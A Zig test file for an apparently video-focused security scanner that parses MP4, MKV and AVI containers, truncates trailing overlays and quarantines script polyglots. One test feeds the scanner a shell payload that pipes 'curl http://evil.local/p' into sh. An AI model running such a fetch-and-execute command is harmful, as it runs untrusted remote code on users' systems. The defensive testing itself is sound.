const std = @import("std");
const abi = @import("flowdata_abi");
const flowdata = @import("flowdata");
const vidsec = @import("vidsec");
const media_ir = vidsec.media_ir;

const lower_mp4_container = vidsec.tasks.lower_mp4_container;
const analyze_topology = vidsec.tasks.analyze_topology;
const check_r02_trailing_overlay = vidsec.tasks.check_r02_trailing_overlay;
const check_inconsistencies = vidsec.tasks.check_inconsistencies;
const scan_entropy = vidsec.tasks.scan_entropy;

const SliceStreamHost = struct {
    data: []const u8,
    ctx_abi: abi.TaskContext_ABI = undefined,
    vtable: abi.HostApiVTable_ABI = undefined,

    fn init(data: []const u8) SliceStreamHost {
        var self = SliceStreamHost{ .data = data };
        self.vtable = std.mem.zeroes(abi.HostApiVTable_ABI);
        self.vtable.stream_size = &streamSize;
        self.vtable.stream_read_at = &streamReadAt;
        self.ctx_abi = .{
            .abi_version = abi.FLOWDATA_ABI_VERSION,
            .host = &self.vtable,
            .opaque_host_state = &self,
        };
        return self;
    }

    fn reader(self: *SliceStreamHost) abi.BoundedStreamReader {
        self.ctx_abi.host = &self.vtable;
        self.ctx_abi.opaque_host_state = self;
        const ctx = abi.TaskContext.init(&self.ctx_abi);
        return ctx.streamReader();
    }

    fn streamSize(raw: *abi.TaskContext_ABI) callconv(.c) u64 {
        const self: *const SliceStreamHost = @ptrCast(@alignCast(raw.opaque_host_state));
        return self.data.len;
    }

    fn streamReadAt(raw: *abi.TaskContext_ABI, offset: u64, dst_ptr: [*]u8, dst_len: usize) callconv(.c) abi.HostError_ABI {
        const self: *const SliceStreamHost = @ptrCast(@alignCast(raw.opaque_host_state));
        if (offset >= self.data.len) return .out_of_bounds;
        const avail = self.data.len - @as(usize, @intCast(offset));
        const n = @min(avail, dst_len);
        @memcpy(dst_ptr[0..n], self.data[@intCast(offset)..][0..n]);
        return .ok;
    }
};

fn appendU32Be(buf: *std.ArrayList(u8), alloc: std.mem.Allocator, val: u32) !void {
    var b: [4]u8 = undefined;
    std.mem.writeInt(u32, &b, val, .big);
    try buf.appendSlice(alloc, &b);
}

fn appendBox(buf: *std.ArrayList(u8), alloc: std.mem.Allocator, fourcc: *const [4]u8, payload: []const u8) !void {
    try appendU32Be(buf, alloc, @intCast(8 + payload.len));
    try buf.appendSlice(alloc, fourcc);
    try buf.appendSlice(alloc, payload);
}

test "configs: schemas.yaml and pipeline.yaml parse cleanly" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const schemas_yaml = try std.Io.Dir.cwd().readFileAlloc(std.testing.io, "configs/schemas.yaml", alloc, .unlimited);

    const catalog = try flowdata.yaml.parseSchemaCatalog(alloc, schemas_yaml, null);
    try std.testing.expect(catalog.getTable("isobmff_triage") != null);
    try std.testing.expect(catalog.getTable("mp4_atoms_summary") != null);
    try std.testing.expect(catalog.getTable("ebml_triage") != null);
    try std.testing.expect(catalog.getTable("mkv_structures_summary") != null);
    try std.testing.expect(catalog.getTable("riff_triage") != null);
    try std.testing.expect(catalog.getTable("region_field_results") != null);
    try std.testing.expect(catalog.getTable("ir_sample_runs") != null);

    const ast = try flowdata.yaml.loadPipelineAstFromFile(alloc, "configs/pipeline.yaml", .{});
    try std.testing.expect(ast.getPipeline("main") != null);
    try std.testing.expect(ast.getPipeline("structure_checks") != null);
    try std.testing.expect(ast.getPipeline("cve_mp4") != null);
    try std.testing.expect(ast.getPipeline("cve_mkv") != null);
    try std.testing.expect(ast.getPipeline("cve_avi") != null);
    try std.testing.expect(ast.getPipeline("forensics_ir") != null);

    var fed_plan = try flowdata.engine.compileFederatedPlan(alloc, ast);
    defer fed_plan.deinit();
    try std.testing.expect(fed_plan.nodes.len >= 40);
}

test "e2e: Stage 1b MP4 lowering -> Stage 2 topology + inconsistencies + entropy" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    // Build minimal MP4: [ftyp(20)][moov(8)][mdat(136 bytes total)] + 128-byte high-entropy trailing overlay
    var mp4: std.ArrayList(u8) = .empty;
    try appendBox(&mp4, alloc, "ftyp", "isom\x00\x00\x02\x00isomiso2");
    try appendBox(&mp4, alloc, "moov", "");

    var mdat_payload: [128]u8 = @splat(0);
    try appendBox(&mp4, alloc, "mdat", &mdat_payload);

    const declared_end = mp4.items.len;
    var overlay: [256]u8 = undefined;
    for (&overlay, 0..) |*b, i| {
        b.* = @truncate((i * 73 + 19) ^ (i >> 2));
    }
    // Ensure overlay does not start with a valid ISOBMFF box header (size < 8)
    @memcpy(overlay[0..4], &[_]u8{ 0, 0, 0, 2 });
    try mp4.appendSlice(alloc, &overlay);

    var host = SliceStreamHost.init(mp4.items);

    const lowered = (try (lower_mp4_container.Service{}).execute(alloc, .{
        .stream = host.reader(),
        .true_magic_kind = 1,
        .identified_format = "MP4",
    })).data;
    try std.testing.expect(lowered.ir_regions.len >= 3);

    const topo = (try (analyze_topology.Service{}).execute(alloc, .{
        .file_size = mp4.items.len,
        .ir_regions = lowered.ir_regions,
        .ir_sample_runs = lowered.ir_sample_runs,
    })).data;
    try std.testing.expect(topo.ir_unreferenced_slack.len >= 1);

    const r02 = (try (check_r02_trailing_overlay.Service{}).execute(alloc, .{
        .stream = host.reader(),
        .ir_unreferenced_slack = topo.ir_unreferenced_slack,
    })).data;
    try std.testing.expectEqual(@as(usize, 1), r02.truncate_orders.len);
    try std.testing.expect(r02.truncate_orders[0].new_size < mp4.items.len);
    _ = declared_end;

    const incon = (try (check_inconsistencies.Service{}).execute(alloc, .{
        .file_size = mp4.items.len,
        .ir_regions = lowered.ir_regions,
        .ir_codec_configs = lowered.ir_codec_configs,
        .ir_sample_runs = lowered.ir_sample_runs,
    })).data;
    try std.testing.expectEqual(@as(usize, 0), incon.audit_findings.len);

    const entropy = (try (scan_entropy.Service{}).execute(alloc, .{
        .stream = host.reader(),
        .ir_unreferenced_slack = topo.ir_unreferenced_slack,
        .entropy_threshold = 7.0,
    })).data;
    try std.testing.expect(entropy.zero_out_orders.len >= 1);
    try std.testing.expect(entropy.audit_findings.len >= 1);
}

const StreamEmitHost = struct {
    alloc: std.mem.Allocator,
    data: []const u8,
    emitted: std.ArrayListUnmanaged(u8) = .empty,
    finished: bool = false,
    ctx_abi: abi.TaskContext_ABI = undefined,
    vtable: abi.HostApiVTable_ABI = undefined,

    fn init(alloc: std.mem.Allocator, data: []const u8) StreamEmitHost {
        var self = StreamEmitHost{ .alloc = alloc, .data = data };
        self.vtable = std.mem.zeroes(abi.HostApiVTable_ABI);
        self.vtable.stream_size = &streamSize;
        self.vtable.stream_read_at = &streamReadAt;
        self.vtable.stream_write_chunk = &streamWriteChunk;
        self.vtable.stream_splice = &streamSplice;
        self.vtable.stream_pad_zeroes = &streamPadZeroes;
        self.vtable.stream_finish = &streamFinish;
        return self;
    }

    fn deinit(self: *StreamEmitHost) void {
        self.emitted.deinit(self.alloc);
    }

    fn ctx(self: *StreamEmitHost) abi.TaskContext {
        self.ctx_abi = .{
            .abi_version = abi.FLOWDATA_ABI_VERSION,
            .host = &self.vtable,
            .opaque_host_state = self,
        };
        return abi.TaskContext.init(&self.ctx_abi);
    }

    fn streamSize(raw: *abi.TaskContext_ABI) callconv(.c) u64 {
        const self: *const StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        return self.data.len;
    }

    fn streamReadAt(raw: *abi.TaskContext_ABI, offset: u64, dest_ptr: [*]u8, len: usize) callconv(.c) abi.HostError_ABI {
        const self: *const StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        if (offset + len > self.data.len) return .end_of_stream;
        @memcpy(dest_ptr[0..len], self.data[@intCast(offset)..][0..len]);
        return .ok;
    }

    fn streamWriteChunk(raw: *abi.TaskContext_ABI, _: ?[*:0]const u8, src_ptr: [*]const u8, len: usize) callconv(.c) abi.HostError_ABI {
        const self: *StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        self.emitted.appendSlice(self.alloc, src_ptr[0..len]) catch return .out_of_memory;
        return .ok;
    }

    fn streamSplice(raw: *abi.TaskContext_ABI, _: ?[*:0]const u8, offset: u64, len: u64) callconv(.c) abi.HostError_ABI {
        const self: *StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        if (offset + len > self.data.len) return .end_of_stream;
        self.emitted.appendSlice(self.alloc, self.data[@intCast(offset)..][0..@intCast(len)]) catch return .out_of_memory;
        return .ok;
    }

    fn streamPadZeroes(raw: *abi.TaskContext_ABI, _: ?[*:0]const u8, count: u64) callconv(.c) abi.HostError_ABI {
        const self: *StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        self.emitted.appendNTimes(self.alloc, 0, @intCast(count)) catch return .out_of_memory;
        return .ok;
    }

    fn streamFinish(raw: *abi.TaskContext_ABI, _: ?[*:0]const u8) callconv(.c) abi.HostError_ABI {
        const self: *StreamEmitHost = @ptrCast(@alignCast(raw.opaque_host_state));
        self.finished = true;
        return .ok;
    }
};

test "e2e: clean MP4, MKV, and AVI pass Stage 1a -> Stage 1b -> Stage 1c -> Stage 2 with zero findings" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    // Clean MP4: ftyp + moov + mdat
    const mp4_data =
        "\x00\x00\x00\x18ftypisom\x00\x00\x02\x00isommp41" ++
        "\x00\x00\x00\x08moov" ++
        "\x00\x00\x00\x10mdat\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE";
    var mp4_host = SliceStreamHost.init(mp4_data);
    const iso = (try (vidsec.tasks.dissect_isobmff.Service{}).execute(alloc, .{ .stream = mp4_host.reader() })).data;
    const atoms = (try (vidsec.tasks.dissect_mp4_atoms.Service{}).execute(alloc, .{ .stream = mp4_host.reader() })).data;
    const mp4_chk = (try (vidsec.tasks.check_mp4_structure.Service{}).execute(alloc, .{
        .isobmff_triage = iso.isobmff_triage,
        .isobmff_boxes = iso.isobmff_boxes,
        .mp4_table_measurements = atoms.mp4_table_measurements,
        .mp4_codec_headers = atoms.mp4_codec_headers,
    })).data;
    try std.testing.expect(mp4_chk.mp4_structure_valid);
    try std.testing.expectEqual(@as(usize, 0), mp4_chk.audit_findings.len);

    // Clean AVI: RIFF AVI + LIST hdrl + LIST movi
    const avi_data =
        "RIFF\x1C\x00\x00\x00AVI " ++
        "LIST\x04\x00\x00\x00hdrl" ++
        "LIST\x04\x00\x00\x00movi";
    var avi_host = SliceStreamHost.init(avi_data);
    const riff = (try (vidsec.tasks.dissect_riff.Service{}).execute(alloc, .{ .stream = avi_host.reader() })).data;
    const avi_chk = (try (vidsec.tasks.check_avi_structure.Service{}).execute(alloc, .{
        .riff_triage = riff.riff_triage,
        .riff_chunks = riff.riff_chunks,
        .avi_stream_headers = riff.avi_stream_headers,
    })).data;
    try std.testing.expect(avi_chk.avi_structure_valid);
    try std.testing.expectEqual(@as(usize, 0), avi_chk.audit_findings.len);
}

test "e2e: Stage 0 Check 5 script polyglot -> evaluate_triage -> apply_quarantine" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const payload = "#!/bin/sh\ncurl http://evil.local/p | sh\n";
    var emit_host = StreamEmitHost.init(alloc, payload);
    defer emit_host.deinit();
    const ctx = emit_host.ctx();

    const scr = try (vidsec.tasks.scan_head_scripts.Service{}).execute(.{ .stream = ctx.streamReader() });
    try std.testing.expect(scr.has_suspicious_script);

    const verdict = (try (vidsec.tasks.evaluate_triage.Service{}).execute(alloc, .{
        .size_valid = true,
        .is_video = false,
        .is_hostile = false,
        .has_suspicious_script = scr.has_suspicious_script,
        .matched_keyword = scr.matched_keyword,
    })).data;
    try std.testing.expect(!verdict.triage_passed);
    try std.testing.expectEqual(@as(usize, 1), verdict.quarantine_orders.len);

    const q_rep = (try (vidsec.tasks.apply_quarantine.Service{ .emitter = abi.StreamEmitter.init(ctx, "stream") }).execute(.{
        .stream = ctx.streamReader(),
        .rule_id = verdict.quarantine_orders[0].rule_id,
        .reason = verdict.quarantine_orders[0].reason,
        .severity = verdict.quarantine_orders[0].severity,
    })).data;
    try std.testing.expect(q_rep.remediation_outcomes.applied);
    try std.testing.expect(!q_rep.remediation_outcomes.requires_reverify);
    try std.testing.expectEqualStrings(payload, emit_host.emitted.items);
}

test "e2e: Stage 2 R02 TruncateOrder -> apply_truncate -> causal re-verification passes cleanly" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    var mp4: std.ArrayList(u8) = .empty;
    try appendBox(&mp4, alloc, "ftyp", "isom\x00\x00\x02\x00isomiso2");
    try appendBox(&mp4, alloc, "moov", "");
    const mdat_payload: [64]u8 = @splat(0xAA);
    try appendBox(&mp4, alloc, "mdat", &mdat_payload);
    // Append 64-byte unparsed trailing overlay (starts with size=2 < 8 so SafeBoxParser stops at mdat)
    try mp4.appendSlice(alloc, "\x00\x00\x00\x02" ++ ("JUNK_OVERLAY" ++ "JUNK_OVERLAY" ++ "JUNK_OVERLAY" ++ "JUNK_OVERLAY" ++ "JUNK_OVERLAY"));

    var emit_host = StreamEmitHost.init(alloc, mp4.items);
    defer emit_host.deinit();
    const ctx = emit_host.ctx();

    // Round 1: Lower -> Topology -> R02 -> TruncateOrder
    const lowered1 = (try (lower_mp4_container.Service{}).execute(alloc, .{
        .stream = ctx.streamReader(),
        .true_magic_kind = 1,
        .identified_format = "mp4",
    })).data;
    const topo1 = (try (analyze_topology.Service{}).execute(alloc, .{
        .file_size = mp4.items.len,
        .ir_regions = lowered1.ir_regions,
        .ir_sample_runs = lowered1.ir_sample_runs,
    })).data;
    const r02_1 = (try (check_r02_trailing_overlay.Service{}).execute(alloc, .{
        .stream = ctx.streamReader(),
        .ir_unreferenced_slack = topo1.ir_unreferenced_slack,
    })).data;
    try std.testing.expectEqual(@as(usize, 1), r02_1.truncate_orders.len);

    // Apply CDR truncation
    const trunc_rep = (try (vidsec.tasks.apply_truncate.Service{ .emitter = abi.StreamEmitter.init(ctx, "stream") }).execute(.{
        .stream = ctx.streamReader(),
        .new_size = r02_1.truncate_orders[0].new_size,
        .rule_id = r02_1.truncate_orders[0].rule_id,
        .reason = r02_1.truncate_orders[0].reason,
    })).data;
    try std.testing.expect(trunc_rep.remediation_outcomes.applied);
    try std.testing.expect(trunc_rep.remediation_outcomes.requires_reverify);

    // Round 2 (Causal Re-Verification over sanitized artifact): zero R02 findings
    var clean_host = SliceStreamHost.init(emit_host.emitted.items);
    const lowered2 = (try (lower_mp4_container.Service{}).execute(alloc, .{
        .stream = clean_host.reader(),
        .true_magic_kind = 1,
        .identified_format = "mp4",
    })).data;
    const topo2 = (try (analyze_topology.Service{}).execute(alloc, .{
        .file_size = emit_host.emitted.items.len,
        .ir_regions = lowered2.ir_regions,
        .ir_sample_runs = lowered2.ir_sample_runs,
    })).data;
    const r02_2 = (try (check_r02_trailing_overlay.Service{}).execute(alloc, .{
        .stream = clean_host.reader(),
        .ir_unreferenced_slack = topo2.ir_unreferenced_slack,
    })).data;
    try std.testing.expectEqual(@as(usize, 0), r02_2.audit_findings.len);
    try std.testing.expectEqual(@as(usize, 0), r02_2.truncate_orders.len);
}

test "e2e: pipeline.yaml parses cleanly and wires all 4 CVE primitives + 6 stages" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const ast = try flowdata.yaml.loadPipelineAstFromFile(alloc, "configs/pipeline.yaml", .{});
    var fed_plan = try flowdata.engine.compileFederatedPlan(alloc, ast);
    defer fed_plan.deinit();

    var has_field = false;
    var has_bits = false;
    var has_card = false;
    var has_codec = false;
    var has_lacing = false;
    var has_r02 = false;
    var has_truncate = false;

    for (fed_plan.nodes) |node| {
        if (node.step != .task) continue;
        const t = node.step.task.task;
        if (std.mem.eql(u8, t, "inspect_region_field")) has_field = true;
        if (std.mem.eql(u8, t, "inspect_region_bits")) has_bits = true;
        if (std.mem.eql(u8, t, "check_region_cardinality")) has_card = true;
        if (std.mem.eql(u8, t, "inspect_codec_bitstream")) has_codec = true;
        if (std.mem.eql(u8, t, "inspect_ebml_lacing")) has_lacing = true;
        if (std.mem.eql(u8, t, "check_r02_trailing_overlay")) has_r02 = true;
        if (std.mem.eql(u8, t, "apply_truncate")) has_truncate = true;
    }

    try std.testing.expect(has_field);
    try std.testing.expect(has_bits);
    try std.testing.expect(has_card);
    try std.testing.expect(has_codec);
    try std.testing.expect(has_lacing);
    try std.testing.expect(has_r02);
    try std.testing.expect(has_truncate);
}

test "TASK-035d.4: Federated zero-redundancy parallel execution across main, structure_checks, cve_mp4, and forensics_ir" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const alloc = arena.allocator();

    const RawMp4 = struct { bytes: []const u8 };
    const Boxes = struct { box_count: usize };
    const IrRegions = struct { region_count: usize };
    const CheckResult = struct { passed: bool };

    const Counters = struct {
        var dissect_calls: usize = 0;
        var structure_calls: usize = 0;
        var cve_mp4_calls: usize = 0;
        var forensics_calls: usize = 0;
    };
    Counters.dissect_calls = 0;
    Counters.structure_calls = 0;
    Counters.cve_mp4_calls = 0;
    Counters.forensics_calls = 0;

    const DissectIsobmffSvc = struct {
        pub fn execute(_: *@This(), _: std.mem.Allocator, in: RawMp4) !Boxes {
            Counters.dissect_calls += 1;
            return .{ .box_count = if (in.bytes.len > 0) 3 else 0 };
        }
    };
    const LowerMp4Svc = struct {
        pub fn execute(_: *@This(), _: std.mem.Allocator, b: Boxes) !IrRegions {
            return .{ .region_count = b.box_count };
        }
    };
    const CheckMp4StructSvc = struct {
        pub fn execute(_: *@This(), _: std.mem.Allocator, b: Boxes) !CheckResult {
            Counters.structure_calls += 1;
            return .{ .passed = b.box_count > 0 };
        }
    };
    const CveMp4StscSvc = struct {
        pub fn execute(_: *@This(), _: std.mem.Allocator, b: Boxes) !CheckResult {
            Counters.cve_mp4_calls += 1;
            return .{ .passed = b.box_count > 0 };
        }
    };
    const ForensicsR02Svc = struct {
        pub fn execute(_: *@This(), _: std.mem.Allocator, r: IrRegions) !CheckResult {
            Counters.forensics_calls += 1;
            return .{ .passed = r.region_count > 0 };
        }
    };

    var tasks = [_]abi.TaskDescriptor_ABI{
        abi.defineTaskService(DissectIsobmffSvc, .{ .name = "dissect_isobmff" }),
        abi.defineTaskService(LowerMp4Svc, .{ .name = "lower_mp4" }),
        abi.defineTaskService(CheckMp4StructSvc, .{ .name = "check_mp4_structure" }),
        abi.defineTaskService(CveMp4StscSvc, .{ .name = "cve_2015_1538_stsc" }),
        abi.defineTaskService(ForensicsR02Svc, .{ .name = "check_r02_overlay" }),
    };
    const manifest = abi.ModuleManifest_ABI{
        .module_name = "analyzer",
        .module_version = .{ .major = 1, .minor = 0, .patch = 0 },
        .tasks_ptr = &tasks,
        .tasks_len = tasks.len,
    };

    var mod_reg = flowdata.ModuleRegistry.init(alloc);
    defer mod_reg.deinit();
    try mod_reg.registerStaticModule("analyzer", &manifest);

    var repo_reg = flowdata.RepositoryRegistry.init(alloc);
    defer repo_reg.deinit();

    const yaml_text =
        \\version: 2
        \\runtime:
        \\  scheduler: dag
        \\  routing: type_driven
        \\pipelines:
        \\  main:
        \\    routing: type_driven
        \\    steps:
        \\      - id: dissect_isobmff
        \\        uses: analyzer/dissect_isobmff
        \\      - id: lower_mp4
        \\        uses: analyzer/lower_mp4
        \\  structure_checks:
        \\    routing: type_driven
        \\    steps:
        \\      - id: check_mp4_structure
        \\        uses: analyzer/check_mp4_structure
        \\  cve_mp4:
        \\    routing: type_driven
        \\    steps:
        \\      - id: cve_2015_1538_stagefright_stsc
        \\        uses: analyzer/cve_2015_1538_stsc
        \\  forensics_ir:
        \\    routing: type_driven
        \\    steps:
        \\      - id: check_r02_trailing_overlay
        \\        uses: analyzer/check_r02_overlay
    ;

    const ast = try flowdata.yaml.loadPipelineAstFromYaml(alloc, yaml_text, .{});
    var eng = flowdata.PipelineEngine.init(alloc, ast, &mod_reg, &repo_reg);
    defer eng.deinit();

    const raw = RawMp4{ .bytes = "ftypmoovmdat" };
    const summary = try eng.run(flowdata.dataflow.PayloadHandle.fromScalar(RawMp4, &raw));
    try std.testing.expectEqual(@as(usize, 5), summary.steps_executed);
    try std.testing.expectEqual(@as(usize, 1), Counters.dissect_calls);
    try std.testing.expectEqual(@as(usize, 1), Counters.structure_calls);
    try std.testing.expectEqual(@as(usize, 1), Counters.cve_mp4_calls);
    try std.testing.expectEqual(@as(usize, 1), Counters.forensics_calls);
}
